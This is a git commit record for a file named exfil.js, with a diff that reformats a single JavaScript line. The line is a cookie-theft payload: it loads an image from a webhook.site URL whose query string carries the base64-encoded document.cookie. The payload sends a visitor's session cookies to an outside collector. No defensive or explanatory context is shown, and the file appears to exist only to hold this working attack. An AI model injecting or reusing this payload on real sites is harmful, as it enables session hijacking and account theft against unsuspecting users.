35a4844a89ab5cd429b6d761a4be75ea7ea77765
Miko Osak <99428858+mikosak@users.noreply.github.com>
2024-10-22 22:44:42 +0100

    Update exfil.js

--- exfil.js
+++ exfil.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/3ef5c86e-9cdb-41b8-bce4-5bedf5d08727?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/3ef5c86e-9cdb-41b8-bce4-5bedf5d08727?data=' + btoa(document.cookie);
